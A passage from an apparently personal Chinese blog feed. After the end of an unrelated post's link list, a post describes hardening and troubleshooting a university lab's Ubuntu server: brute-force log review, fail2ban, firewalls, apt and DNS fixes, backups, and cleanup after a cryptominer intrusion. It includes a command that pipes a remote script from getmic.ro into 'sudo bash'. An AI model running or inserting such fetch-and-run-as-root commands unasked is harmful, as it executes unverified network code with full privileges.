<span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVlc3RjLmVkdS5jbi8/bj1VZXN0Y05ld3MuRnJvbnQuRG9jdW1lbnQuQXJ0aWNsZVBhZ2UmYW1wO0lkPTcyMzgy">学校举行第四期思政及师德师风培训班结业典礼暨师德师风建设专题会议<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnVlc3RjLmVkdS5jbi8/bj1VZXN0Y05ld3MuRnJvbnQuRG9jdW1lbnQuQXJ0aWNsZVBhZ2UmYW1wO0lkPTY3MTE4">四川省教育厅网站报道我校师德师风建设工作<i class="fa fa-external-link-alt"></i></span> 可以看到是有这个电子科技大学师德建设委员会的</li>
<li>Oh CD ZZ 友情频道的相关报道<br />
<span class="exturl" data-url="aHR0cHM6Ly90Lm1lL29oY2R6ei8xMDA3">https://t.me/ohcdzz/1007<i class="fa fa-external-link-alt"></i></span> 、 <span class="exturl" data-url="aHR0cHM6Ly90Lm1lL29oY2R6ei84MjQ=">https://t.me/ohcdzz/824<i class="fa fa-external-link-alt"></i></span>等</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzE3NTYyOTY4">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？ - 真实工科肥宅的回答 - 知乎<i class="fa fa-external-link-alt"></i></span>郑老师的学校和论文，郑老师是成理博士百度百科</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI5MTUyMTM5MS9hbnN3ZXIvNDc3NDEwMTI0">如何看待美国女权领袖、MeToo 运动发起者被曝性侵男演员后暗中支付巨额封口费？ - 奈芙拉塔的回答 - 知乎<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQ2NDQ1NjYyL2Fuc3dlci8xMDEzMzc2NDQ=">邵振海事件<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzYxOTc2MzUyL2Fuc3dlci8xOTM1NjYyMTI=">张翼德事件<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cud2VpYm8uY29tLzM5MTA3MzY0NjcvR2tHZWhyaDdr">宁宁事件<i class="fa fa-external-link-alt"></i></span></li>
<li>河畔帖子（需要账号，这里不放了）</li>
<li>《中国印刷史研究》辛德勇 太长不看版，辛德勇微信公众号文章：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJek16ZzJNVFF3Tnc9PSZhbXA7bWlkPTIyNDc0ODg2MDQmYW1wO2lkeD0xJmFtcDtzbj0zZWQzYTViMWU4ZGYyMjVkN2I3ZTNkZGU1YjY0MDU4ZA==">我看中國古代的活字印刷<i class="fa fa-external-link-alt"></i></span></li>
</ol>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
  </entry>
  <entry>
    <title>教研室服务器维护</title>
    <url>/d6da/</url>
    <content><![CDATA[<p>教研室要倒闭啦，师兄毕业跑路啦！ <span id="more"></span></p>
<h2 id="写在前面的话">写在前面的话</h2>
<p>top、ls命令并不总是好用，特别是挖矿恶意程序使用rookit等方式隐藏进程、篡改系统命令，会出现CPU跑满但是top命令看不到高占用进程的情况</p>
<p>不想用vim又不得不在linux下改东西，可以不用nano了，这有个<span class="exturl" data-url="aHR0cHM6Ly93bWRwZC5jb20vcWlhbmctbGllLXR1aS1qaWFuLWxpbnV4emhvbmctZHVhbi13ZW4tYmVuLWJpYW4tamktcWktbWljcm8v">micro<i class="fa fa-external-link-alt"></i></span>, 拿好</p>
<p>安装：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> /usr/bin<span class="token punctuation">;</span> <span class="token function">curl</span> https://getmic.ro <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="安全问题">安全问题</h2>
<p>教研室的服务器之前就被黑过 老师兄装的Ubuntu，默认端口默认用户名超简单密码直接远程登录，行吧 教研室出现了断层，现在的师兄们（以及并夕夕40万却没用过Linux的师姐）Linux都还没我熟，行吧 服务器以后就扔给我了，行吧</p>
<p>之前折腾Docker的时候看日志发现一堆乱七八糟的</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">grep</span> <span class="token string">"Accepted password for root"</span> /var/log/auth.log <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$11</span>&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -nr <span class="token operator">|</span> <span class="token function">more</span>
<span class="token function">grep</span> <span class="token string">"Failed password for root"</span> /var/log/auth.log <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$11</span>&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -nr <span class="token operator">|</span> <span class="token function">more</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>发现一堆可疑ip几千次登录尝试,哇,又被当小鸡扫了</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">3073 Failed
  2593 112.85.42.185
  2471 218.92.0.168
   714 112.85.42.187
   363 218.92.0.188
   261 112.85.42.188
   103 222.186.175.220
   103 222.186.175.148
    86 222.186.180.41
    81 222.186.173.180
    78 222.186.180.8
    78 222.186.180.223
    74 222.186.173.154
    69 222.186.175.161
    65 49.88.112.55
    59 222.186.180.9
    59 222.186.175.182
    57 222.186.180.17
    57 222.186.175.167
    55 222.186.175.202
    55 185.164.72.251
    53 222.186.175.215
    51 222.186.169.194<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>改一下密码和SSH端口</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sed</span> -i <span class="token string">"s/Port .*/Port 你的端口/g"</span> /etc/ssh/sshd_config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>安装sshfilter或者flai2ban，这里我用的fail2ban。<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> fail2ban
<span class="token function">sudo</span> <span class="token function">cp</span> /etc/fail2ban/fail2ban.conf /etc/fail2ban/fail2ban.local
<span class="token function">sudo</span> <span class="token function">cp</span> /etc/fail2ban/jail.conf /etc/fail2ban/jail.local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>配置文件修改.local, 会像next.yml一样把.conf文件自动覆盖掉（直接修改那两个conf下次更新可能会覆盖掉）。</p>
<p>主要参数就是那个bantime和maxretry，这里我设成2小时和10次</p>
<p>然后启动</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start fail2ban
systemctl <span class="token builtin class-name">enable</span> fail2ban<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>其他操作</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fail2ban-client <span class="token builtin class-name">set</span> sshd addignoreip <span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token comment"># IP白名单</span>
fail2ban-client <span class="token builtin class-name">set</span> sshd unbanip <span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token comment"># 解封IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>还要配置一下防火墙 iptables很繁琐，不涉及太多配置的情况下可以用UFW</p>
<h3 id="防火墙端口">防火墙端口</h3>
<p>端口用的时候要打开，不然会出各种烦人的问题，比如wget下载没开443就会<code>443... failed: Connection refused.</code>，如果你加了~--no-check-certificate`还是failed，那八成是防火墙的问题 查看端口开放状态</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">netstat</span> -ntlp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">telnet <span class="token function">ip</span> port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ubuntu里用ufw查看状态</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> ufw status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查看指定端口的状态（没输出可能是没开）</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">netstat</span> -ntlp<span class="token operator">|</span><span class="token function">grep</span> <span class="token number">443</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>打开443端口</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">iptables -I INPUT -p tcp --dport <span class="token number">443</span> -j ACCEPT
<span class="token function">service</span> iptables save
<span class="token function">service</span> iptables restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>使用UFW, 直接</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> ufw allow <span class="token number">443</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>用iptables打开指定端口, 一般开80，443，53，22，其他按需打开</p>
<p>可以安装这个来永久保存配置</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> iptables-persistent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="docker默认修改iptables规则">Docker默认修改iptables规则</h3>
<p>Docker不设置会默认修改iptables规则，将端口暴露在外面，导致端口映射在安全上并没有什么卵用，要设置一下一下，可以看这里 <span class="exturl" data-url="aHR0cHM6Ly93d3cuYmluc3MubWUvYmxvZy9kb2NrZXItcGFzcy10aHJvdWdoLXN5c3RlbS1maXJld2FsbC8=">https://www.binss.me/blog/docker-pass-through-system-firewall/<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="https">HTTPs</h2>
<p>申请SSL证书</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ssl-cert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后搞一个自己的域名，因为境内服务器要备案，此计划中道崩殂</p>
<h2 id="运行sudo-apt-get-update报错">运行<code>sudo apt-get update</code>报错</h2>
<p>写在前面，我看到有的镜像源示例配置都是走的HTTPS，似乎没有必要 详见<span class="exturl" data-url="aHR0cHM6Ly93aHlkb2VzYXB0bm90dXNlaHR0cHMuY29tLw==">Why does APT not use HTTPS?<i class="fa fa-external-link-alt"></i></span>。 至于某Debian镜像源上说的什么安装apt-transport-https更是没有必要，画蛇添足</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Get:1 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial InRelease [454 B]
Get:2 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-updates InRelease [454 B]
Get:3 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-backports InRelease [454 B]
Get:4 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-security InRelease [454 B]
Err:1 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial InRelease
  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)
Err:2 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-updates InRelease
  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)
Err:3 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-backports InRelease
  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)
Err:4 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-security InRelease
  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>查了一下说是代理的问题，看了一下教研室的工作站竟然还有酸酸乳和bbr，一问师兄说是老板外出的时候想上学校网用这个，行吧</p>
<p>设置一下apt的代理</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">&#x2F;etc&#x2F;apt$ cat apt.conf

Acquire::http::proxy &quot;http:&#x2F;&#x2F;&lt;proxy&gt;&quot;;
Acquire::https::proxy &quot;https:&#x2F;&#x2F;&lt;proxy&gt;&quot;;
Acquire::ftp::proxy &quot;ftp:&#x2F;&#x2F;&lt;proxy&gt;&quot;;
Acquire::socks::proxy &quot;socks:&lt;proxy&gt;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里我切进目录没找到，发现有个apt.conf.d文件夹，是表示缺省的配置文件，删掉换成apt.conf 比如代理是1.2.3.4，端口1234 就改成<code>Acquire::http::proxy "http://1.2.3.4:1234</code></p>
<p>改了一下发现不对，这边是服务端应该没开代理啊</p>
<p>把代理都删了</p>
<p>感觉可能DNS有问题,切到<code>etc/resolv.conf</code>看了一下</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">nameserver 202.112.14.21
nameserver 202.112.14.11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这个学校的DNS服务不行啊，别的都直通互联网，这个上不了谷歌不说，还经常不对外网提供解析服务 (能ping通,但是nslookup发现不对外网提供服务) 又看了一下工作站的DNS, 果然换过了 校园网暂时也没什么好的DNS，就先换了清华的 (那个DNS不是<code>/etc/resolv.conf</code>下的，要改<code>/etc/resolvconf/resolv.conf.d</code>下的<code>base</code>文件,第一个只是临时的DNS)</p>
<p>还要刷新一下DNS：<code>sudo service networking restart</code></p>
<p>运行<code>sudo apt-get upgrade</code>又报了这个错<code>Hash Sum mismatch</code></p>
<p>查了一下发现就是阿里云镜像源在教育网下的问题</p>
<p>算了,改镜像源吧,换了清华的</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Err:1 https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu xenial InRelease
  Failed to connect to mirrors.tuna.tsinghua.edu.cn port 443: Connection timed out<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>依然不行, 决定明天重装</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">E: Some index files failed to download. They have been ignored, or old ones used instead.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>看了一下，工作站那台DNS是<code>cat /etc/resolv.conf</code>是127.0.0.1，是DNSmasq托管的，而服务器上的还是你电的DNS，决定改了。 工作站上应该是这样的</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log"># &#x2F;etc&#x2F;network&#x2F;interfaces
dns-nameservers 8.8.8.8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>改了之后服务器的<code>resolv.conf</code>也是<code>127.0.0.1</code>了 又上大清的网站看了一下，发现居然在维护</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20191115103425.png" alt="Picture" style="zoom:80%;" /></p>
<p>换成你电的，好了，收工</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ubuntu-apt.png" alt="Picture" style="zoom:80%;" /></p>
<p>又报了<code>Target Translations (main/i18n/Translation-en) is configured multiple times in</code>, 查了一下是指定apt源冲突了，删掉一个就好了</p>
<h2 id="查看配置">查看配置</h2>
<p>本来想用neofetch查看一下服务器的配置，结果apt装不了。 看了一下官方文档发现16.10要这样</p>
<p>Add PPA <code>sudo add-apt-repository ppa:dawidd0811/neofetch</code> Update repositories <code>sudo apt update</code> Install the package <code>sudo apt install neofetch</code> （安装neofetch还能下载编译，可能还快一点）</p>
<p>算了，好慢啊，直接用<code>sudo dmidecode</code>看吧，screenfetch也行 英特尔的e5 2630 v4，20核CPU，没显卡。这CPU平时居然没人用，空跑,居然还有公网ip，我仿佛发现了宝藏。不出意外就留给我挥（bei）霍（guo）了</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">                         .&#x2F;+o+-       root@labserver
                 yyyyy- -yyyyyy+      OS: Ubuntu 16.04 xenial
              :&#x2F;&#x2F;+&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;-yyyyyyo      Kernel: x86_64 Linux 4.12.14-041214-generic
          .++ .:&#x2F;++++++&#x2F;-.+sss&#x2F;&#96;      Uptime: 21h 36m
        .:++o:  &#x2F;++++++++&#x2F;:--:&#x2F;-      Packages: 718
       o:+o+:++.&#96;..&#96;&#96;&#96;.-&#x2F;oo+++++&#x2F;     Shell: bash 4.3.48
      .:+o:+o&#x2F;.          &#96;+sssoo+&#x2F;    WM: Not Found
 .++&#x2F;+:+oo+o:&#96;             &#x2F;sssooo.   CPU: Intel Xeon CPU E5-2630 v4 @ 3.1GHz
&#x2F;+++&#x2F;&#x2F;+:&#96;oo+o               &#x2F;::--:.   RAM: 1348MiB &#x2F; 32074MiB
\+&#x2F;+o+++&#96;o++o               ++&#x2F;&#x2F;&#x2F;&#x2F;.
 .++.o+++oo+:&#96;             &#x2F;dddhhh.
      .+.o+oo:.          &#96;oddhhhh+
       \+.++o+o&#96;&#96;-&#96;&#96;&#96;&#96;.:ohdhhhhh+
        &#96;:o+++ &#96;ohhhhhhhhyo++os:
          .o:&#96;.syhhhhhhh&#x2F;.oo++o&#96;
              &#x2F;osyyyyyyo++ooo+++&#x2F;
                  &#96;&#96;&#96;&#96;&#96; +oo+++o\:
                         &#96;oo++.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="更新">更新</h2>
<p>发现不是镜像源的问题，是你电的镜像源没安排上https，这个服务器好像是证书的问题，https全都用不了，wget也不行。</p>
<h2 id="滚动升级">滚动升级</h2>
<p>不存在的，这又不是arch系，不要乱升，乱升级滚挂了是要背锅的 要升可以用</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> do-release-upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>升完记得把apt源给换了 看到有安全更新，说 &gt;<strong><em>System restart required</em></strong></p>
<p>reboot一下就行了</p>
<h2 id="网络问题">网络问题</h2>
<h3 id="网很慢">网很慢</h3>
<p>很迷，有的地方很快，有的地方就几乎慢到断线。我的联通就经常ping不同。 据说老蔡师兄他那里也经常ping不通</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ping-ubuntu.jpg" alt="Picture" style="zoom:60%;" /></p>
<p>就是网不好。。。而且上行网速更差，有的时候只有100k/s（用的是一个月20块的基础套餐，没加钱）</p>
<pre class="line-numbers language-none"><code class="language-none">Testing download speed..................................
Download: 11.72 Mbyte&#x2F;s
Testing upload speed....................................
Upload: 2.45 Mbyte&#x2F;s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="掉线">掉线</h3>
<p>受疫情影响，全教研室在家连服务器，但是服务器的网络还总掉线 跑一个自动重启网络服务的脚本，直接抄<span class="exturl" data-url="aHR0cDovL3d3dy5saXV4aWFvLm9yZy8yMDE5LzA4L3VidW50dS3kuIvnm5Hmjqflubboh6rliqjph43lkK/nvZHljaEv">这里<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="备份和恢复">备份和恢复</h2>
<p>师兄也没装什么东西，用的cp直接备份了点文件，一言不合重装系统。 先暂时用cp备份一次 挂载一下盘(比如挂到/mnt/mydata)，用cp复制 (挂载看这里<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>)</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">mount</span> /dev/sdb7 /mnt
<span class="token function">nohup</span> <span class="token function">cp</span> -pdr /srv /mnt/mydata <span class="token operator">>></span> logs.out <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span>
<span class="token function">umount</span> /dev/sdb7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这样将/srv目录下的文件全部拷贝到mydata下面. 文件很大，cp没有进度条，以后试试gcp之类的命令，先这样吧</p>
<p>看了一下，有接近300G的数据，用cp命令太慢了 用dd，把,整盘拷贝（dd命令不要乱用，一不小心就删库了）</p>
<p>拷贝完<code>umount /mydata</code>再拔</p>
<p>下次试试rsync同步，据说能断点续传和md5验证</p>
<p>更新，发现一款叫clonezilla的软件，使用clonezilla备份非常方便。</p>
<h2 id="使用教研室服务器下载">使用教研室服务器下载</h2>
<p>教研室的服务器有一个单独的猫和ip，网速绝大多数时候不低于50M/s，今天才发现比我的小破工位上的网速快不少。 以后下数据集和数据库文件之类的大东西就用它了！</p>
<h2 id="使用tmux">使用Tmux</h2>
<p>（其实MobaXterm有一个叫Multiexec的功能） 正在备份文件结果网断了（没办法，校园网就是这么....） 这时就要用tmux之类的工具了</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> tmux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="图形界面">图形界面</h2>
<p>MobaXterm内嵌有Xserver，可以调出图形化窗口。 比如nedit,Emacs之类的 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/xserver.png" alt="Picture" style="zoom:80%;" /> 已经足够应付简单的图形化界面需求了 完整的桌面需求请直接VNC或teamviewer到工作站操作。</p>
<h2 id="卸载遗留的docker并重装">卸载遗留的Docker并重装</h2>
<p>目前还报这样的错</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Cannot connect to the Docker daemon at unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock. Is the docker daemon running?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>似乎重装iptables的时候会直接把那个Docker的一部分依赖卸掉 （Docker好像还会直接修改默认的防火墙规则，emmmm)</p>
<p>更新，解决了，是网络问题，离线装就好了</p>
<h2 id="教研室的阿里云">教研室的阿里云</h2>
<p>真的，有毒哇 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/apt.png" alt="Picture" style="zoom:80%;" /> 是的，师兄跟我说没有apt。。。<strong>行吧</strong></p>
<p>装一个</p>
<p>等等，不对劲，这是Centos啊</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/centos.png" alt="Picture" style="zoom:80%;" /></p>
<p>行吧...........那没事了。师兄真的.....我感觉我上了贼船</p>
<h2 id="报备">报备</h2>
<p>按学校信息中心的要求，固定IP都需要申请报备，还有一堆乱七八糟的事</p>
<h3 id="系统日志和杀毒">系统日志和杀毒</h3>
<p>学校信息中心要求备份系统日志和杀软。 然而这Linux有什么装杀软的必要吗？防火墙就完事了。 行吧，交差还是要装模做样的应付一下</p>
<p>安装ClamAV：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> clamav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>直接扫描报错了，要升级病毒库<code>sudo freshclam</code></p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">LibClamAV Error: cli_loaddbdir(): No supported database files found in &#x2F;var&#x2F;lib&#x2F;clamav
ERROR: Can&#39;t open file or directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后扫一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> clamscan -r -i /  <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>系统安装日志，不知道要交什么，索性把apt和dpkg的日志交了,在<code>/var/log/</code>和<code>/var/log/apt/</code>目录下面</p>
<h3 id="端口报备">端口报备</h3>
<p>一般22，80，443，再加上几个常用的端口就够了 实在不行还有端口转发</p>
<p>看一下开了的端口</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -znv <span class="token number">211</span>.XXX.XXX.XXX <span class="token number">1</span>-10000  <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">grep</span> succeeded<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="域名">域名</h3>
<p>暂时还没有，备案麻烦没弄</p>
<h2 id="清理trash">清理Trash</h2>
<p>工作站桌面变得非常卡，clamscan扫描home目录也扫了整整两天，看了一下发现有前前任师兄几百个G的数据。使用rm之后跑到了.local文件夹下。使用跑路命令把它们删掉。(最好不要把 .local全删了，只删Trash就行了<code>.local/share/Trash</code>)</p>
<h2 id="其他">其他</h2>
<p>Gitlab占用过高的问题等见瞎折腾记录(其实没有特殊需求可以用Gogs，小声逼逼) 在服务器上部署jupyter参考<span class="exturl" data-url="aHR0cHM6Ly9iaXRtaW5ndy5jb20vMjAxNy8wNy8wOS9ydW4tanVweXRlci1ub3RlYm9vay1zZXJ2ZXIv">搭建 ipython/jupyter notebook 服务器<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="远程开发">远程开发</h2>
<p>为什么要远程呢，因为我的电脑是小破i5，8G内存，装双系统不太行，虚拟机更不行。用wsl真的不如直接上服务器20核CPU、工作站两块1080pi（还有单独的网线和公网IP）。配合SSH端口转发和VSCode、JB全家桶，还是很舒服的。</p>
<h2 id="部署项目">部署项目</h2>
<h3 id="标注工具doccano">标注工具doccano</h3>
<p>这里以开源标注工具doccano为例（该项目提供了Docker镜像和直接部署的方法以及docker-compose示例文件，还给了aws等一键部署脚本）</p>
<p>我们clone下来，修改settings.py文件</p>
<p>最简单的方法就是直接上docker</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> clone https://github.com/doccano/doccano.git
$ <span class="token builtin class-name">cd</span> doccano
$ docker-compose -f docker-compose.prod.yml up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>docker打包通常会很大，动不动就上G了，一些轻量且不至于弄坏系统环境的东西建议还是裸跑</p>
<h2 id="一次被黑记录">一次被黑记录</h2>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">CPU  [||||||||||||||||                 51.8%]   CPU -    51.8%  nice:     0.0%  ctx_sw:    8K   MEM -   21.7%  active:    5.31G   SWAP -    0.0%   LOAD    20-core
MEM  [|||||||                          21.7%]   user:    51.3%  irq:      0.0%  inter:   5508   total:  31.3G  inactive:  4.27G   total:    976M  
····
lo                         0b     0b   999.5  0.0   2.34G 2.44M   2654 root        67h8:58 16    0 S    ? ?    .&#x2F;cron
2020-01-15 16:17:54 CST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>症状：昨天（2020.1.14）root上不去了，rsa密钥也挂了，以为是网的问题，今天一试还不行。用自己的另一个账号登了一下，发现<code>su root</code>居然permission denied了。怀疑是被黑了，一看系统占用，有挖矿程序在跑，而且网络带宽占用也很高，怀疑是被当成肉鸡对外攻击了。看了一下系统日志，是一月13号被黑的，照着网上清了一遍。从此禁用密码登录（之前就想禁，师兄嫌麻烦）。MySQL也禁用密码改ssl</p>
<p>clamav再扫一遍</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> clamscan -r /root <span class="token number">2</span> <span class="token operator">>></span> err.out <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>更新：</p>
<p>之前没清干净，貌似又被黑了</p>
<p>症状，运行<code>apt update</code>的时候</p>
<pre class="line-numbers language-none"><code class="language-none">Errors were encountered while processing:
 clamav-freshclam
 clamav
E: Sub-process &#x2F;usr&#x2F;bin&#x2F;dpkg returned an error code (1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>然而运行了一下freshclam</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@xi102:~<span class="token comment"># freshclam</span>
Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> ClamAV update process started at Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span>
Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> daily.cld database is up to <span class="token function">date</span> <span class="token punctuation">(</span>version: <span class="token number">25743</span>, sigs: <span class="token number">2209759</span>, f-level: <span class="token number">63</span>, builder: raynman<span class="token punctuation">)</span>
